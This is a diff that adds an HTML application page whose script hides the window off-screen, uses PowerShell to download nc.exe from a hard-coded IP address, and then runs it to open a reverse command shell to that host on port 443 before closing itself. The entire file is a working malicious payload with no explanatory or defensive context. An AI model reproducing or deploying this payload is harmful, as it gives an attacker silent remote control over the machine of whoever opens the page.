@@ -1,0 +1,26 @@
+<html>
+
+<head>
+
+<script>
+    window.moveTo -4000, -4000
+
+    var c2 = "powershell.exe (new-object net.webclient).downloadfile('http://192.168.119.183/nc.exe', 'c:\\windows\\tasks\\nc.exe')"
+    new ActiveXObject('WScript.Shell').Run(c2)
+
+    var c3 = 'cmd.exe /c c:\\windows\\tasks\\nc.exe -e cmd 192.168.119.183 443'
+    new ActiveXObject('WScript.Shell').Run(c3)
+
+</script>
+
+</head>
+
+<body>
+
+<script>
+    self.close()
+</script>
+
+</body>
+
+</html>
